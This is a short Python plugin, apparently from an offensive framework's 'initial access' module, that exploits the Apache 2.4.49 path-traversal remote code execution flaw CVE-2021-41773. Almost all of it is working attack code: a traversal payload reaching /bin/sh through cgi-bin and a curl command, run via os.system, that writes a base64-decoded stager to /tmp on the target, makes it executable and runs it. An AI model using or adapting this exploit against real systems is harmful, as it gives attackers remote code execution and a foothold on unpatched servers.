# [PLUGIN INITIAL ACCESS] Apache 2.4.49 RCE CVE-2021-41773

import requests
import os

def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int, stager: str) -> bool | Exception:
    """
    Try to exploit the vulnerability
    """
    try:
        host = 'http://{0}:{1}'.format(ip_dest, port_dest)
        print('[+] Attempting to gain initial access with CVE-2021-41773 on {}'.format(host))
        requests.get(host)
        payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
        rs = '/bin/bash -c "echo {0} | base64 -d > /tmp/stager.sh && chmod +x /tmp/stager.sh && /tmp/stager.sh"'.format(stager.decode("utf-8"))
        cmd = "curl -s --path-as-is '{1}{2}' --data 'echo Content-Type: text/plain; echo; {0}' &".format(rs, host, payload)
        os.system(cmd)
        return True
        
    except Exception as e:
        return e
